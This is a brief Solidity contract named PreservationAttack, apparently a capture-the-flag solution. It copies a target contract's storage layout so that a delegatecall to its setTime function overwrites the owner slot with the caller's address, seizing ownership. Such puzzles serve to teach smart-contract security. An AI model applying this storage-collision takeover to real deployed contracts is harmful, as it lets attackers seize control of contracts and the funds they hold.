//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
    address timeZone1;
    address timeZone2;
    address public owner;
    uint storedTime;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}